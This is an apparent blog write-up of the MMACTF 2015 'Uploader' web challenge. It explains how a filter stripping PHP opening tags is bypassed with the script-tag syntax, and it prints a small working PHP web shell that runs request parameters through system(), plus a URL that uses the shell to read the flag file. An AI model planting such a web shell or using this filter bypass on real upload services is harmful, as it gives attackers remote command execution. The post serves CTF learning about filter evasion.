---
author: AnirudhAnand
layout: post
title: 'Executing php using script tags - MMACTF 2015, Uploader, web 100 writeup'
categories:
- webchallenges
- ctf-web
keywords: CTF, webhacking
summary: Do you happen to know that PHP can be executed using script tags ?
---

Well this was quite a fascinating challenge. We are greeted with a challenge which has a direct file upload which even uploads `.php` but will not execute it because there is a filter which goes through the file we uploaded and removes all `<?php` tags from it. I tried several ways to escape out of Regex filter (or what ever filter they are using) but I just couldn't do it. 

After reading and trying a lot of different methods (every single one failed), I read the description of the challenge again: 

    This uploader deletes all /<\?|php/. So you cannot run php. 
    
Well, now thats interesting. If they want to disallow the PHP execution, they why did they allow us to upload `.php` extension files ? They can easily limit the upload feature but they didn't which means our aim is to execute php web shell without using the `<?php` to write the code. 

Frankly speaking, I had no idea on how to execute without adding `<?php`. So I googled around to see an alternative option and I was shocked to read **[php tags documentation](http://php.net/manual/en/language.basic-syntax.phptags.php)**. Did you see an awesome method of executing php there ?

`<script language="php"> </script>`

That moment I didn't know how to explain but I was quite surprised. Now lets right a simple web shell using the same:

{%highlight php lineos %}

<script language="phP">
    if(isset($_REQUEST['cmd'])){
        $cmd = ($_REQUEST["cmd"]);
        system($cmd);
        die;
    }
</script>

{%endhighlight%}.

Called it `shell.php` and uploaded it. The uploader gives me direct access to the file with which I can run system commands :-). Now its a matter of searching for the flag and it was there in the root directory itself.
 
 `http://recocta.chal.mmactf.link:9080/u/shelll.php?cmd=cat%20/flag`
 
 This gives me back the flag I was looking for.
 
 Flag: `MMA{you can run php from script tag} `
 
 The challenge were super fun and a good learning too. I never knew that `<script language="php">` could actually execute php. Thanks to the organizers of MMACTF for the awesome challenges.
 
 Also read: [Local File inclusion + File Upload = Remote Code execution - MMACTF 2015 web 300 writeup]({{ site.url }}/2015/09/07/mmactf-web300-challenge-writeup/)
